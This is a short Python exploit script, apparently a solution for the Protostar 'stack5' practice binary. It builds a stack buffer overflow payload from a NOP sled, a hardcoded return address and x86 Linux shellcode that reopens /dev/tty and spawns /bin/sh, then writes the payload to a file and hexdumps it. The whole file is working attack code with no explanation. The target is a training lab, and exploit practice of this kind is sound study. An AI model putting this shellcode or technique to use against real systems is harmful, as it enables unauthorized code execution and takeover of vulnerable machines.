#!/usr/bin/python


import os
import sys
import struct
from ctypes import *

sc="\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

def xpl(binpath, buff_size):

    buf=''
    edump='exploit_5.dump'

    print("[+] Buffsize: {0}, ({1})".format(buff_size, hex(buff_size)))
    print("[+] Shellcode: {0}".format(len(sc)))

    # 72
    for i in range(0, buff_size-4):
        buf += struct.pack('<B', 0x90)
    print("[+] NOPs num: {0}".format(len(buf)))
    #buf += struct.pack('<L', 0xdeadbeef) # RET
    buf += struct.pack('<L', 0xbffff740) # RET

    buf += sc

    with open(edump, 'w') as fd:
        fd.write(buf)

    os.system('hexdump -C '+edump)  

xpl('/opt/protostar/bin/stack5', int(0x50))
